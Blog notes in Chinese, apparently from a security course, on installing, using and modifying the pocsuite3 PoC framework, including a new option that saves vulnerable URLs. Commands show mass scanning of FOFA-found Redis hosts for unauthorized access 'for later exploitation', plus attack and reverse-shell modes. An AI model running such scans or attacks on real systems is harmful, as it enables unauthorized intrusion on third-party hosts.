alt="image-20220417144650395"></p><p>此时还有一个参数 , 没有解决就是 <code>--save-file</code> , 思考一下什么时候 , 应该保存呢 ? 肯定是所有的url检测结束了 ,这个时候再把存在漏洞的保存 , ok , 继续跟踪框架的生命流程 , 找到了检测完毕后的代码位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pocsuite3\lib\controller\controller.py</span><br></pre></td></tr></table></figure><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20220417150748932.png" alt="image-20220417150748932"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># 所有线程poc扫描结束后,默认poc的返回值都追加到results列表中</span></span><br><span class="line">    <span class="comment"># 需求,把所有结果中存在漏洞的根据当前的任务追加到一个文本中去,方便后期单独利用</span></span><br><span class="line">    <span class="comment"># 提交了文件保存的参数 , 目前没有解决的问题,保存路径不能存在多级不存在的目录</span></span><br><span class="line">    <span class="keyword">if</span> conf.save_file:</span><br><span class="line">        <span class="comment"># 转换成绝对路径</span></span><br><span class="line">        full_path = os.path.abspath(conf.save_file)</span><br><span class="line">        <span class="comment"># 拿到上一层目录</span></span><br><span class="line">        dir_path = os.path.dirname(full_path)</span><br><span class="line">        <span class="comment"># 判断当前路径是否存在</span></span><br><span class="line">        is_exist = os.path.exists(dir_path)</span><br><span class="line">        <span class="comment"># 如果不存在,创建</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> is_exist:</span><br><span class="line">            <span class="comment"># 不能创建多层目录</span></span><br><span class="line">            os.mkdir(dir_path)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&quot;<span class="subst">&#123;full_path&#125;</span>&quot;</span>, mode=<span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> res <span class="keyword">in</span> kb.results:</span><br><span class="line">                <span class="keyword">if</span> res.status == <span class="string">&quot;success&quot;</span>:</span><br><span class="line">                    f.write(res.url + <span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure><p>注意记得导入os模块</p><p>ok , 两个参数添加完毕 , 当然你也可以在cmd.py中按照个人习惯修改默认的线程数</p><h3 id="1-3测试"><a href="#1-3测试" class="headerlink" title="1.3测试"></a>1.3测试</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pocsuite -r ./pocs/redis_unauthorized_access.py   --dork-fofa port=\&quot;6379\&quot;  --max-size 500 --save-file ./redis_res.txt --threads 50</span><br><span class="line"></span><br><span class="line">注意：在pocsuit3下的pocsuit3测试</span><br><span class="line"></span><br><span class="line">python3 cli.py  -r ./pocs/redis_unauthorized_access.py   --dork-fofa port=\&quot;6379\&quot;  --max-size 500 --save-file ./redis_res.txt --threads 50</span><br></pre></td></tr></table></figure><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20220417153506909.png" alt="image-20220417153506909"></p><p>以后你要做的事情 , 就是自己写pocsuite3 的 poc , 或者把别人的poc你自己修改成 pocsuite3的poc</p><p>然后找到对应的fofa语句 , 这不就可以批量了吗 ?</p><p><strong>是不是yyds , 大家是不是可以喊一波666</strong></p><p>比如你还想完美一下 , 比如新增一下整个poc运行检测的时间 , 可以在入口文件 cli.py中新增</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在try里面定义也可以,只是为了让finally不报黄色,因为写在里面很有可能会在定义之前代码报错了</span></span><br><span class="line">   start_time = time.time()</span><br><span class="line">   </span><br><span class="line">   ...</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">       <span class="comment"># 14.无论是否报错,最终都会有一个数据输出</span></span><br><span class="line">       data_to_stdout(<span class="string">&quot;\n[*] shutting down at &#123;0&#125; 共耗时&#123;1&#125;秒\n\n&quot;</span>.<span class="built_in">format</span>(time.strftime(<span class="string">&quot;%X&quot;</span>),time.time()-start_time ))</span><br></pre></td></tr></table></figure><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20220417152513992.png" alt="image-20220417152513992"></p><h3 id="1-4小总结"><a href="#1-4小总结" class="headerlink" title="1.4小总结"></a>1.4小总结</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">关于二开</span><br><span class="line">1.框架的整个生命流程通过debug全部跟一遍</span><br><span class="line">2.不懂的就print 调试输出 , 一定要写代码注释</span><br><span class="line">3.参考框架原来的代码规范再新增</span><br></pre></td></tr></table></figure><h2 id="2-作业"><a href="#2-作业" class="headerlink" title="2.作业"></a>2.作业</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.首先完善 xxl-job 个人poc文件</span><br><span class="line">同样操作检测 canal 弱口令  title=&quot;Canal Admin&quot;</span><br><span class="line">2.框架二开改好  , 自己最好记录</span><br><span class="line">3.把 xxl-job  , canal , cve-2022-26134 , CVE-2021-46422 改写成pocsuite3的poc文件</span><br><span class="line">4.自己去github收集 pocsuite3 的各种 nday 的poc  , 直接github搜</span><br><span class="line">5.github新建仓库把自己编写的 poc/exp 发布到上面 , 明天上课直接屏幕共享展示</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pocsuit3初体验</title>
      <link href="/2023/04/02/pocsuite3%E6%A1%86%E6%9E%B6%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
      <url>/2023/04/02/pocsuite3%E6%A1%86%E6%9E%B6%E5%88%9D%E4%BD%93%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="1-pocsuite3介绍"><a href="#1-pocsuite3介绍" class="headerlink" title="1.pocsuite3介绍"></a>1.pocsuite3介绍</h2><h3 id="1-1pocsuite3是什么"><a href="#1-1pocsuite3是什么" class="headerlink" title="1.1pocsuite3是什么"></a>1.1pocsuite3是什么</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pocsuite3 是由Knownsec 404 团队开发的开源远程漏洞测试和概念验证开发框架。它配备了强大的概念验证引擎，为终极渗透测试人员和安全研究人员提供了许多不错的功能。并且该工具被kali收录到系统自带工具</span><br></pre></td></tr></table></figure><h3 id="1-2为什么要使用它"><a href="#1-2为什么要使用它" class="headerlink" title="1.2为什么要使用它"></a>1.2为什么要使用它</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">按照框架的开发规范编写的poc更加的标准</span><br><span class="line">pocsuite3内部帮助我们解决了并发的问题 , 支持多线程检测 , 就不用自己考虑线程的问题了</span><br><span class="line">pocsuite3集合了常见的网络测绘引擎的api , 更方便我们批量检测 , 可以直接和fofa语句联动</span><br></pre></td></tr></table></figure><p><strong>pocsuite3的特点</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">PoC 脚本可以在 verify, attack, shell 模式下以不同的方式运行</span><br><span class="line">插件生态系统</span><br><span class="line">从任何地方（本地文件、redis、数据库、Seebug ...）动态加载 PoC 脚本</span><br><span class="line">从任何地方加载多目标（CIDR、本地文件、redis、数据库、Zoomeye、Shodan fofa ...）</span><br><span class="line">结果可以轻松导出</span><br><span class="line">动态补丁和钩子请求</span><br><span class="line">命令行工具和python包导入都可以使用</span><br><span class="line">IPV6 支持</span><br><span class="line">全球 HTTP/HTTPS/SOCKS 代理支持</span><br><span class="line">用于 PoC 脚本的简单蜘蛛 API</span><br><span class="line">与Seebug集成（用于从 Seebug 网站加载 PoC）</span><br><span class="line">与ZoomEye集成（用于从 ZoomEye 加载目标Dork）</span><br><span class="line">与Shodan集成（用于从 Shodan 加载目标Dork）</span><br><span class="line">与Ceye集成（用于验证盲 DNS 和 HTTP 请求）</span><br><span class="line">与Interactsh集成（用于验证盲 DNS 和 HTTP 请求）</span><br><span class="line">与 Fofa 集成（用于从 Fofa 加载目标Dork）</span><br><span class="line">使用 IDE 的友好调试 PoC 脚本</span><br></pre></td></tr></table></figure><h3 id="1-3pocsuite3如何使用"><a href="#1-3pocsuite3如何使用" class="headerlink" title="1.3pocsuite3如何使用"></a>1.3pocsuite3如何使用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">下载</span><br><span class="line">安装</span><br><span class="line">常见参数详情</span><br><span class="line">常见使用示例</span><br><span class="line">源码阅读</span><br><span class="line">简单的二开</span><br></pre></td></tr></table></figure><h2 id="2-下载-amp-安装-amp-卸载"><a href="#2-下载-amp-安装-amp-卸载" class="headerlink" title="2.下载&amp;安装&amp;卸载"></a>2.下载&amp;安装&amp;卸载</h2><p>项目地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/knownsec/pocsuite3</span><br></pre></td></tr></table></figure><p>提一嘴  Knownsec 404 项目都非常的不错 , github可以关注一手</p><p>环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Python 3.7+</span><br><span class="line">Works on Linux, Windows, Mac OSX, BSD, etc.</span><br></pre></td></tr></table></figure><p>pip安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pip3 install pocsuite3</span><br><span class="line"></span><br><span class="line"># use other pypi mirror</span><br><span class="line">pip3 install -i https://pypi.tuna.tsinghua.edu.cn/simple pocsuite3</span><br></pre></td></tr></table></figure><p>git clone</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/knownsec/pocsuite3.git（需要翻墙才能访问到）</span><br><span class="line">cd pocsuite3</span><br><span class="line"></span><br><span class="line">pip3 install -r requirements.txt  #安装依赖 （不需要翻墙）</span><br><span class="line"></span><br><span class="line">先在源码中修改一下（二开）再配置环境变量</span><br><span class="line"></span><br><span class="line">python3 setup.py install   #配置环境变量，这样就可以在任意文件运行</span><br><span class="line"></span><br><span class="line">注意二开是在在 python3目录下的pocsuit3修改</span><br></pre></td></tr></table></figure><p>安装好测试</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">D:\<span class="title">maye</span>\常用工具\<span class="title">pocsuite3</span>\<span class="title">pocsuite3</span>-<span class="title">master</span>\<span class="title">pocsuite3</span>&gt;<span class="title">pocsuite</span> --<span class="title">version</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">,------.                        ,--. ,--.       ,----.   &#123;1.9.2-<span class="title">nongit</span>-20220315&#125;</span></span><br><span class="line"><span class="function">|  .--. &#x27;,---. ,---.,---.,--.,--`--,-&#x27;  &#x27;-.,---.&#x27;.-.  |</span></span><br><span class="line"><span class="function">|  &#x27;--&#x27; | .-. | .--(  .-&#x27;|  ||  ,--&#x27;-.  .-| .-. : .&#x27; &lt;</span></span><br><span class="line"><span class="function">|  | --&#x27;&#x27; &#x27;-&#x27; \ `--.-&#x27;  `&#x27;  &#x27;&#x27;  |  | |  | \   --/&#x27;-&#x27;  |</span></span><br><span class="line"><span class="function">`--&#x27;     `---&#x27; `---`----&#x27; `----&#x27;`--&#x27; `--&#x27;  `----`----&#x27;   <span class="title">https</span>://<span class="title">pocsuite.org</span></span></span><br><span class="line"><span class="function"><span class="title">usage</span>: <span class="title">pocsuite</span> [<span class="title">options</span>]</span></span><br><span class="line"><span class="function"><span class="title">Pocsuite3</span>: <span class="title">error</span>: <span class="title">unrecognized</span> <span class="title">arguments</span>: <span class="title">version</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Press</span> <span class="title">Enter</span> <span class="title">to</span> <span class="title">continue</span>...</span></span><br></pre></td></tr></table></figure><p>卸载</p><p>如果你是pip3安装的话</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 uninstall pocsuite3</span><br></pre></td></tr></table></figure><p>如果你是git clone安装的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip3 uninstall pocsuite3</span><br><span class="line"></span><br><span class="line"># 然后删除克隆的文件 , 即可彻底删除</span><br></pre></td></tr></table></figure><h2 id="3-使用参考"><a href="#3-使用参考" class="headerlink" title="3.使用参考"></a>3.使用参考</h2><p>官方文档</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/knownsec/pocsuite3/blob/master/docs/USAGE.md</span><br></pre></td></tr></table></figure><p>可惜全是英文的 , 没事 , 简单翻译一下常用的参数是什么意思</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">D:\maye\常用工具\FofaViewer_1.1.6&gt;pocsuite -h</span><br><span class="line"></span><br><span class="line">,------.                        ,--. ,--.       ,----.   &#123;1.9.2-nongit-20220415&#125;</span><br><span class="line">|  .--. &#x27;,---. ,---.,---.,--.,--`--,-&#x27;  &#x27;-.,---.&#x27;.-.  |</span><br><span class="line">|  &#x27;--&#x27; | .-. | .--(  .-&#x27;|  ||  ,--&#x27;-.  .-| .-. : .&#x27; &lt;</span><br><span class="line">|  | --&#x27;&#x27; &#x27;-&#x27; \ `--.-&#x27;  `&#x27;  &#x27;&#x27;  |  | |  | \   --/&#x27;-&#x27;  |</span><br><span class="line">`--&#x27;     `---&#x27; `---`----&#x27; `----&#x27;`--&#x27; `--&#x27;  `----`----&#x27;   https://pocsuite.org</span><br><span class="line">usage: pocsuite [options]</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help            # 查看帮助信息</span><br><span class="line">  --version             # 查看版本</span><br><span class="line">  --update             # 更新pocsuite3版本</span><br><span class="line">  -v &#123;0,1,2,3,4,5,6&#125;    Verbosity level: 0-6 (default 1)</span><br><span class="line"></span><br><span class="line">Target: # 目标</span><br><span class="line">  At least one of these options has to be provided to define the target(s)</span><br><span class="line">  </span><br><span class="line">（*）</span><br><span class="line">  -u URL [URL ...], --url URL [URL ...]   # 单个目标 </span><br><span class="line">                        Target URL (e.g. &quot;http://www.site.com/vuln.php?id=1&quot;)</span><br><span class="line">  -f URL_FILE, --file URL_FILE   # 批量检测目标 , 每一行是一个url, 即一个目标</span><br><span class="line">                        Scan multiple targets given in a textual file</span><br><span class="line">  -r POC [POC ...]         # 加载poc文件 , 可以是本地或者远程的seebug</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  -k POC_KEYWORD    Filter PoC by keyword, e.g. ecshop    # 按照poc关键字筛选</span><br><span class="line">  -c CONFIGFILE         Load options from a configuration INI file  # 从配置INI文件加载选项</span><br><span class="line"></span><br><span class="line">Mode: # 模式</span><br><span class="line">  Pocsuite running mode options</span><br><span class="line"></span><br><span class="line">  --verify              Run poc with verify mode      # poc验证模式</span><br><span class="line">  --attack              Run poc with attack mode    # poc攻击模式</span><br><span class="line">  --shell               Run poc with shell mode        # poc反弹shell模式</span><br><span class="line"></span><br><span class="line">Request:  # 请求</span><br><span class="line">  Network request options  # 网络请求选项 , 检测的本质也是发请求, 可以自定义一些请求头</span><br><span class="line"></span><br><span class="line">  --cookie COOKIE       HTTP Cookie header value  </span><br><span class="line">  --host HOST           HTTP Host header value</span><br><span class="line">  --referer REFERER     HTTP Referer header value</span><br><span class="line">  --user-agent AGENT    HTTP User-Agent header value (default random)</span><br><span class="line">  --proxy PROXY         Use a proxy to connect to the target URL</span><br><span class="line">  --proxy-cred PROXY_CRED</span><br><span class="line">                        Proxy authentication credentials (name:password)   # 代理需要认证</span><br><span class="line">  --timeout TIMEOUT     Seconds to wait before timeout connection (default 30)</span><br><span class="line">  --retry RETRY         Time out retrials times # 超时, 重试次数</span><br><span class="line">  --delay DELAY         Delay between two request of one thread   # 一个线程的两个请求之间的延迟</span><br><span class="line">  --headers HEADERS     Extra headers (e.g. &quot;key1: value1\nkey2: value2&quot;)  # 请求头</span><br><span class="line"></span><br><span class="line">Account: # 账号</span><br><span class="line">  Telnet404, Shodan, CEye, Fofa account options</span><br><span class="line"></span><br><span class="line">  --login-user LOGIN_USER   # 404账号</span><br><span class="line">                        Telnet404 login user</span><br><span class="line">  --login-pass LOGIN_PASS  # 404密码</span><br><span class="line">                        Telnet404 login password</span><br><span class="line">  --shodan-token SHODAN_TOKEN  # 撒旦账号的token</span><br><span class="line">                        Shodan token</span><br><span class="line">  --fofa-user FOFA_USER     # fofa账号</span><br><span class="line">                        fofa user</span><br><span class="line">  --fofa-token FOFA_TOKEN  # fofa 账号的token</span><br><span class="line">                        fofa token</span><br><span class="line">  --quake-token QUAKE_TOKEN # quake账号的token</span><br><span class="line">                        quake token</span><br><span class="line">  --censys-uid CENSYS_UID # censys 账号的uid</span><br><span class="line">                        Censys uid</span><br><span class="line">  --censys-secret CENSYS_SECRET  # censys 账号的secret</span><br><span class="line">                        Censys secret</span><br><span class="line"></span><br><span class="line">Modules: # 模块 , 可以直接结合网络空间测绘引擎的语句直接批量检测</span><br><span class="line">  Modules(Seebug, Zoomeye, CEye, Fofa, Quake, Listener) options</span><br><span class="line"></span><br><span class="line">  --dork DORK           Zoomeye dork used for search   # 默认钟馗之眼的语句</span><br><span class="line">  --dork-zoomeye DORK_ZOOMEYE</span><br><span class="line">                        Zoomeye dork used for search</span><br><span class="line">  --dork-shodan DORK_SHODAN</span><br><span class="line">                        Shodan dork used for search</span><br><span class="line">  --dork-censys DORK_CENSYS</span><br><span class="line">                        Censys dork used for search</span><br><span class="line">  --dork-fofa DORK_FOFA</span><br><span class="line">                        Fofa dork used for search</span><br><span class="line">  --dork-quake DORK_QUAKE</span><br><span class="line">                        Quake dork used for search</span><br><span class="line">  --max-page MAX_PAGE   Max page used in search API  # 最大的页数 , 不好使</span><br><span class="line">  --search-type SEARCH_TYPE</span><br><span class="line">                        search type used in ZoomEye API, web or host   # 搜索类型</span><br><span class="line">  --vul-keyword VUL_KEYWORD</span><br><span class="line">                        Seebug keyword used for search      # 使用Seebug漏洞关键字搜索</span><br><span class="line">  --ssv-id SSVID        Seebug SSVID number for target PoC  # 使用 ssv-id搜索对应的poc</span><br><span class="line">  --lhost CONNECT_BACK_HOST</span><br><span class="line">                        Connect back host for target PoC in shell mode  # shell模式下的反弹ip</span><br><span class="line">  --lport CONNECT_BACK_PORT</span><br><span class="line">                        Connect back port for target PoC in shell mode    # shell模式下的反弹port</span><br><span class="line">  --tls                 Enable TLS listener in shell mode</span><br><span class="line">  --comparison          Compare popular web search engines   # 使用比较流行的搜索引擎搜索</span><br><span class="line">  --dork-b64            Whether dork is in base64 format         # 语句的base64格式</span><br><span class="line"></span><br><span class="line">Optimization: # 选项</span><br><span class="line">  Optimization options</span><br><span class="line"></span><br><span class="line">  --plugins PLUGINS     Load plugins to execute   # 加载插件执行</span><br><span class="line">  --pocs-path POCS_PATH  </span><br><span class="line">                        User defined poc scripts path    # 用户定义的poc脚本路径</span><br><span class="line">  --threads THREADS     Max number of concurrent network requests (default 1)  # 线程数</span><br><span class="line">  --batch BATCH         Automatically choose defaut choice without asking    # 自动选择默认的询问</span><br><span class="line">  --requires            Check install_requires    # 检查安装要求</span><br><span class="line">  --quiet               Activate quiet mode, working without logger   # 安静模式, 终端不输出日志</span><br><span class="line">  --ppt                 Hiden sensitive information when published to the network # 在发布到网络时隐藏敏感信                                               息</span><br><span class="line">  --pcap                use scapy capture flow  # 使用scapy捕获流</span><br><span class="line">  --rule                export suricata rules, default export reqeust and response  # 导出suricata规则、默认导出请求和响应</span><br><span class="line">  --rule-req            only export request rule  # 只导出请求规则</span><br><span class="line">  --rule-filename RULE_FILENAME   </span><br><span class="line">                        Specify the name of the export rule file   # 指定导出规则的文件名</span><br><span class="line"></span><br><span class="line">Poc options:  # poc 选项</span><br><span class="line">  definition options for PoC</span><br><span class="line"></span><br><span class="line">  --options             Show all definition options   # 显示默认选项值</span><br></pre></td></tr></table></figure><h3 id="3-1单个url"><a href="#3-1单个url" class="headerlink" title="3.1单个url"></a>3.1单个url</h3><p>单个url使用验证模式运行 poc。PoC(s) 将仅用于漏洞扫描。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pocsuite -r pocs/poc_example.py -u http://www.example.com/ --verify</span><br><span class="line">                       poc文件的路径                  待检测的url</span><br><span class="line">                       </span><br><span class="line">pocsuite -r pocs/thinkphp_rce2.py  -u http://192.168.6.29:8080/ --verify</span><br></pre></td></tr></table></figure><h3 id="3-2批量检测"><a href="#3-2批量检测" class="headerlink" title="3.2批量检测"></a>3.2批量检测</h3><p>扫描文本文件中给定的多个目标</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pocsuite -r pocs/poc_example.py -f url.txt --verify</span><br></pre></td></tr></table></figure><h3 id="3-3使用Seebug-SSVID"><a href="#3-3使用Seebug-SSVID" class="headerlink" title="3.3使用Seebug SSVID"></a>3.3使用Seebug SSVID</h3><p>POCFILE 可以是文件或 Seebug SSVID。pocsuite 插件可以从任何地方加载 poc 代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pocsuite -r ssvid-97343 -u http://www.example.com --shell</span><br></pre></td></tr></table></figure><h3 id="3-4验证模式"><a href="#3-4验证模式" class="headerlink" title="3.4验证模式"></a>3.4验证模式</h3><p><strong>–verify</strong> 使用验证模式运行 poc。PoC(s) 将仅用于漏洞扫描</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pocsuite -r pocs/poc_example.py -u http://www.example.com/ --verify</span><br></pre></td></tr></table></figure><h3 id="3-5攻击模式"><a href="#3-5攻击模式" class="headerlink" title="3.5攻击模式"></a>3.5攻击模式</h3><p><strong>–attack</strong> 以攻击模式运行 poc，PoC(s) 将被利用，它可能允许黑客&#x2F;研究人员闯入实验室</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pocsuite -r pocs/poc_example.py -u http://www.example.com/ --attack</span><br><span class="line">pocsuite -r pocs/thinkphp_rce2.py  -u http://192.168.6.29:8080/ --attack</span><br></pre></td></tr></table></figure><h3 id="3-6shell模式"><a href="#3-6shell模式" class="headerlink" title="3.6shell模式"></a>3.6shell模式</h3><p><strong>–shell</strong> 以 shell 模式运行 poc，PoC 将可被利用，当 PoC shellcode 成功执行时，pocsuite3 将进入交互式 shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pocsuite -r pocs/poc_example.py -u http://www.example.com --shell</span><br></pre></td></tr></table></figure><p>看看就好</p><p>比较鸡肋 , 不好用 , 而且我们用的最多还是写poc , 验证是否存在漏洞 , 存在了 , 利用就用exp直接打</p><h3 id="3-7线程数"><a href="#3-7线程数" class="headerlink" title="3.7线程数"></a>3.7线程数</h3><p>使用多线程，默认线程数为1</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pocsuite -r pocs/poc_example.py -f url.txt --verify --threads 10</span><br></pre></td></tr></table></figure><h3 id="3-8fofa语句"><a href="#3-8fofa语句" class="headerlink" title="3.8fofa语句"></a>3.8fofa语句</h3><p>如果您是<a href="https://github.com/knownsec/pocsuite3/blob/master/docs/fofa"><strong>Fofa</strong></a>用户，可以使用fofa语句进行批量查询：</p><p>使用关键字搜索网络服务器 thinkphp <code>body=&quot;thinkphp&quot;</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pocsuite -r pocs/thinkphp_rce2.py --dork-fofa &#x27;body=\&quot;thinkphp\&quot;&#x27; --search-type web --thread 20</span><br></pre></td></tr></table></figure><p>好像并不好用</p><p>其中最常用的就是前面两条和最后一条</p><h2 id="4-POC编写"><a href="#4-POC编写" class="headerlink" title="4.POC编写"></a>4.POC编写</h2><p>官方文档</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md</span><br></pre></td></tr></table></figure><p>官方提供的是有模板的 , 直接拿模板改就ok了</p><p>模板路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 